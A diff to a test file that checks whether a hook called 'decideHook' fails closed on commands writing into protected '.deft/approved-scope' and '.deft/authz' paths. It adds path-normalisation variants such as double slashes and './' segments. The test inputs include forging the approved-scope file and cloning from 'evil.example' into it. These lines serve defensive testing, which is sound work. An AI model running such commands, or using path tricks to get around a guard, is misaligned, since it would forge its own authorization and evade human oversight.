@@ -1151,6 +1151,9 @@ describe("UAT residual dest-form writers fail-closed (#3421)", () => {
       "cp forged.json .deft/approved-scope/story.json",
       "echo x > .deft/approved-scope/story.json",
       "git clone https://evil.example/r .deft/approved-scope/evil",
+      "echo x > .deft//approved-scope/story.json",
+      "echo x > .deft/./approved-scope/story.json",
+      "cp forged.json .deft//approved-scope/story.json",
     ]) {
       const decision = decideHook(
         {
@@ -1199,6 +1202,7 @@ describe("UAT residual dest-form writers fail-closed (#3421)", () => {
       "grep -f .deft/authz/patterns.txt src.txt",
       "Get-Content -Path .deft/authz/state.json",
       "git log -- .deft/authz/state.json",
+      "git log worktree -- .deft/authz/state.json",
     ]) {
       const decision = decideHook(
         {
